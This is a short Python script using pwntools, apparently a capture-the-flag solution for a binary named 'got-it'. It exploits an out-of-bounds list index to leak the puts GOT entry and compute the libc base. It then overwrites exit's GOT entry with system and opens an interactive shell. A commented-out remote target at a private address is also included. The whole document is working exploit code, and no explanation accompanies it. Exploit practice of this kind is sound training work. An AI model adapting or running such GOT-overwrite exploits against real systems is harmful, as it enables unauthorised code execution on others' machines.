from pwn import *

context(arch='amd64', os='linux', log_level='debug')
s = process("./got-it")
# s=remote("192.168.3.253",51006)
libc = ELF("./libc.so.6")
elf = ELF("./got-it")


def menu(ch):
    s.sendlineafter(b">> ", str(ch).encode())


def show(idx):
    menu(2)
    s.sendlineafter(b"id: ", str(idx).encode())
    s.recvuntil(b"name: ")
    return s.recvline()[:-1]


def edit(idx, name):
    menu(3)
    s.sendlineafter(b"id: ", str(idx).encode())
    s.sendafter(b"name: ", name)


lst_addr = elf.sym.list
exit_addr = elf.got.exit
exit_offset = (exit_addr - lst_addr) // 8  # -11 , 一定要用整数

puts_got = elf.got.puts
puts_offset = (puts_got - lst_addr) // 8  # -17

dat = show(puts_offset)
info(dat)
libc.address = u64(dat.ljust(8, b"\x00")) - libc.sym.puts
success(hex(libc.address))
edit(exit_offset, p64(libc.sym.system)[:6])
menu(0x2023)
s.interactive()
